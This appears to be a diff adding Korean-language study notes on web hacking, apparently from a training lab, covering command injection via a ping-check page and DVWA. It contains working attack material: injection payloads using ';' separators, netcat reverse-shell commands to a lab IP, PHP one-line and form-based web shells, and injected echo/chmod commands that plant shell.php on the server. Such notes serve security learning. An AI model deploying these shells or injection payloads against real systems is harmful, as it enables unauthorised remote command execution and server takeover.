@@ -1,0 +1,89 @@
+웹해킹
+SQL injection :  공격자(ATTACK) ---> 애플리케이션(Application) --> 데이터베이스(Database)
+커맨드 인젝션 공격, OS command Injection, 운영 체계 명령 실행
+OS command Injection :  공격자(ATTACK) ---> 애플리케이션(Application) --> SYSTEM(command)
+
+PHP ---> <?php  ?>    (  <?  ?> 처럼 사용가능 )
+html 같이 사용 가능 ------  <? <html> </html> ?> 처럼은 사용 불가하다. 
+php 규칙이 있다.  <? echo "<html> </html>"; ?>
+- admin 이 있으면 Ping Check 와 XML Parser 메뉴를 볼 수 있다.
+- <a class="p-2 text-dark" href="index.php?page=pingcheck">Ping Check</a>
+  <a href="">하이퍼링크....이동</a>
+  class="p-2 text-dark"  스타일시트(CSS)
+  index.php?page=pingcheck  ---->  index.php 에 get 방식으로 $page 를 넘기는데 값 pingcheck 이다.
+
+<?
+if(empty($_SESSION["id"])) {
+   참
+} else { 
+    // roror 사용자(id)으로 로그인시 해당  else  실행
+    모두 출력:  <a class="p-2 text-dark" href="index.php?page=mypage&id=<?=$_SESSION["id"]?>">MyPage</a>
+    if($_SESSION["id"] == "admin") {
+        <a class="p-2 text-dark" href="index.php?page=pingcheck">Ping Check</a>
+        <a class="p-2 text-dark" href="index.php?page=xmlparser">XML Parser</a>
+    } 
+   모두 출력:  <a class="p-2 text-dark" href="logout.php">Logout</a>
+}
+?>
+
+$host = $_[0];
+@output = `ping -c 3 $host 2>&1`;
+@output = `ping -c 3 8.8.8.8;ls 2>&1`;
+http://10.0.0.152:7007/index.cgi?Host=8.8.8.8;ls
+
+- 공격 코드
+` ,  ;  , &
+Linux/Unix : &, &&, |, ||, \n, ; 등...
+Windows :  &, &&, |, ||     ( ping 8.8.8.8 & ls)
+
+- 취약함수(PHP등에서 내부 시스템 명령어를 사용하도록 해주는 함수)
+Perl : open(), sysopen(), system(), glob()
+PHP : exec(), system(), passthru(), popen(), require(), include(), eval()
+        shell_exec()
+
+- netcat 
+서버 : # nc -lvp 4444   
+클라이언트 : # nc 서버IP 4444   ( -e /bin/bah )
+록키 : nc 칼리IP 4444 -e /bin/bash
+칼리 : nc -lvp 4444 
+DVWA [    ;nc 10.0.0.131 4444 -e /bin/bash   ]
+
+
+<? 
+//$cmd = $_GET['cmd'];if(!empty($cmd)){system($cmd);} 
+$cmd = $_REQUEST['cmd'];if($cmd!=""){print shell_exec($cmd);}
+?>
+<? $page ?>  <---> <?=$page?>
+
+
+---------------------------------
+<?
+$cmd = $_POST['cmd'];
+$page = $_SERVER['PHP_SELF'];
+if(!empty($cmd))
+{
+        $result = shell_exec($cmd);
+}
+?>
+<html>
+<head><title>WebShell</title></head>
+<body>
+ <form action='<?=$page?>' method='post'>
+  <input type='txt' name='cmd'>
+  <input type='submit' value='실행'>
+ </form>
+ <hr>
+ <table style='board: 1px solid black; background-color: black'>
+  <tr>
+   <td style='color: white; font-size: 12px'>
+   <?=$result?>
+   </td>
+  </tr>
+ </table>
+</body>
+</html>
+------------------------------------------------------------
+
+;echo > shell.php
+;chmod 777 shell.php
+;echo "<? \$cmd = \$_REQUEST['cmd'];if(\$cmd!=\"\"){print shell_exec(\$cmd);} ?>" >> shell.php
